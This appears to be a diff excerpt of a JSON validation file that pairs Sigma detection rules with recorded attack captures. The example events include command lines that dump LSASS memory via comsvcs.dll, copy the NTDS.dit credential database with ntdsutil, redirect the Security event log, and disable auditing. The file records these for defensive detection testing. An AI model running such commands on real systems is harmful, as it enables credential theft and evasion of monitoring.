+        "NewProcessName": "C:\\Windows\\System32\\rundll32.exe",
+        "CommandLine": "\"C:\\Windows\\System32\\rundll32.exe\" C:\\windows\\System32\\comsvcs.dll MiniDump 756 C:\\Users\\wardog\\AppData\\Local\\Temp\\lsass-comsvcs.dmp full"
+      },
+      "status": "pass"
+    },
+    {
+      "metadata_id": "SDWIN-220705170038",
+      "dataset_ground_truth_at_pinned_commit": [
+        "T1562.002"
+      ],
+      "source_rule": "proc_creation_win_susp_eventlog_clear.yml",
+      "rule_mapping_status": "needs_review",
+      "sigma_technique_tags_at_pinned_commit": [
+        "T1685.001",
+        "T1685.005"
+      ],
+      "capture": "datasets/atomic/windows/defense_evasion/host/cmd_wevtutil_modify_security_eventlog_path.zip",
+      "matching_event_count": 1,
+      "example": {
+        "EventID": 1,
+        "Image": "C:\\Windows\\System32\\wevtutil.exe",
+        "OriginalFileName": "wevtutil.exe",
+        "ParentImage": "-",
+        "CommandLine": "wevtutil  set-log Security /logfilename:\"C:\\Windows\\System32\\winevt\\Not-Important-Log.evtx\"",
+        "User": "DESKTOP-CQF82L6\\pedro"
+      },
+      "status": "pass"
+    },
+    {
+      "metadata_id": "SDWIN-220630130349",
+      "dataset_ground_truth_at_pinned_commit": [
+        "T1562.002"
+      ],
+      "source_rule": "proc_creation_win_auditpol_susp_execution.yml",
+      "rule_mapping_status": "mapping_candidate",
+      "sigma_technique_tags_at_pinned_commit": [
+        "T1685.001"
+      ],
+      "capture": "datasets/atomic/windows/defense_evasion/host/auditpol_system_user_auditpolicy_modification.zip",
+      "matching_event_count": 30,
+      "example": {
+        "EventID": 4688,
+        "NewProcessName": "C:\\Windows\\System32\\auditpol.exe",
+        "CommandLine": "auditpol.exe /set /user:pedro /category:\"DS Access\" /success:disable"
+      },
+      "status": "pass"
+    },
+    {
+      "metadata_id": "SDWIN-230718151900",
+      "dataset_ground_truth_at_pinned_commit": [
+        "T1003.003"
+      ],
+      "source_rule": "proc_creation_win_ntdsutil_usage.yml",
+      "rule_mapping_status": "mapping_candidate",
+      "sigma_technique_tags_at_pinned_commit": [
+        "T1003.003"
+      ],
+      "capture": "datasets/atomic/windows/credential_access/host/cmd_dumping_ntds_dit_file_ntdsutil.zip",
+      "matching_event_count": 447,
+      "example": {
+        "EventID": 4688,
+        "NewProcessName": "C:\\Windows\\System32\\ntdsutil.exe",
+        "CommandLine": "ntdsutil  \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\ntds_T1003\" q q"
+      },
+      "status": "pass"
+    }
+  ]
+}
